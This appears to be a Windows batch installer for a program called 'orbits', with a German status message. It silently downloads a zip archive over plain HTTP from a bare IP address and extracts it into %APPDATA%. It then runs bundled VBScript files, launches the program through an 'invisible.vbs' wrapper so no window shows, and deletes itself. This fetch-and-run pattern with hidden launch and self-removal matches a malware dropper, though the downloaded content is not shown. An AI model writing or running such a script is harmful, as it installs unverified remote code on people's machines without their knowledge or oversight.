@echo off
SET WORKING_DIRECTORY=%cd%
SET origfile=%~f0
cd %APPDATA%
if not exist orbits mkdir orbits
cd orbits
echo Orbits wird heruntergeladen und gestartet...
curl -s -o orbits.zip 37.114.47.76/orbits.zip
tar -xf orbits.zip -C . > nul
del orbits.zip
cd %APPDATA%/orbits
wscript bin\shortcuts.vbs
copy "orbits.lnk" "%WORKING_DIRECTORY%\orbits.lnk" > nul
copy "orbits - console.lnk" "%WORKING_DIRECTORY%\orbits - console.lnk" > nul
copy "orbits - uninstall.lnk" "%WORKING_DIRECTORY%\orbits - uninstall.lnk" > nul
start wscript "bin\invisible.vbs" "%WORKING_DIRECTORY%\orbits.lnk"
(GOTO) 2>nul & del "%origfile%"